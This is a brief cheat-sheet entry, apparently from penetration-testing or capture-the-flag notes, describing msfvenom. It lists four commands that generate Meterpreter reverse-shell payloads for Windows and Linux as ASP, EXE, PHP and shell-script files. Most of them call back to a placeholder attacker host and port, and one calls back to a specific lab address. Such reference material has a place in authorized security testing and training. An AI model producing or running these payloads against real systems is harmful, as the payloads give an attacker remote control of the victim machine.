## msfvenom
Creates reverse shells for different platforms

### Example
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f asp > shell.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f exe > shell.exe
msfvenom -p linux/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f php > shell.php
msfvenom -p linux/meterpreter/reverse_tcp LHOST=10.10.14.190 LPORT=8001 -f sh > shell.sh
```